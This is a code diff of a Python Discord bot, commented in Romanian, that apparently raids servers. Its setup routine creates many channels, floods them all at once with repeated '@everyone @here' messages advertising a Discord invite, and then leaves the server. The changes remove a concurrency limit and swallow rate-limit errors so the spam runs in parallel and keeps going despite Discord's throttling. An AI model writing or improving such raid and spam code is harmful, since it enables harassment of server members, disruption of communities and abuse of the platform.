@@ -1,4 +1,3 @@
-
 # -*- coding: utf-8 -*-
 import asyncio, base64, json, os, random, time
 from datetime import datetime
@@ -331,7 +330,6 @@ async def setup(ctx):
 
     await user.send(f"🔄 Încep crearea a {total_channels} de canale...")
 
-    # Elimin semaforul pentru inițiale – lăsăm să ruleze toate în paralel
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
     async def send_initial_messages(channel):
@@ -373,7 +371,7 @@ async def setup(ctx):
 
     await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create!")
 
-    # ===== SPAM FINAL PE TOATE CANALELE SIMULTAN (FĂRĂ SEMAFOR) =====
+    # ===== SPAM FINAL PE TOATE CANALELE SIMULTAN =====
     await user.send("🔄 Începe spam-ul final pe toate canalele simultan...")
 
     async def spam_final(channel):
@@ -387,17 +385,13 @@ async def setup(ctx):
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await channel.send(content=msg)
                 await asyncio.sleep(0.06)
-        except discord.HTTPException as e:
-            if e.status == 429:
-                pass
-            else:
-                raise
-        except:
+        except Exception:
+            # Orice eroare (inclusiv rate-limit) oprește doar acest task, nu pe celelalte
             pass
 
     # Lansează toate task-urile simultan, fără semafor
     spam_tasks = [spam_final(ch) for ch in created_channels]
-    await asyncio.gather(*spam_tasks)
+    await asyncio.gather(*spam_tasks, return_exceptions=True)
 
     await user.send("✅ Spam final complet. Părăsesc serverul...")
 
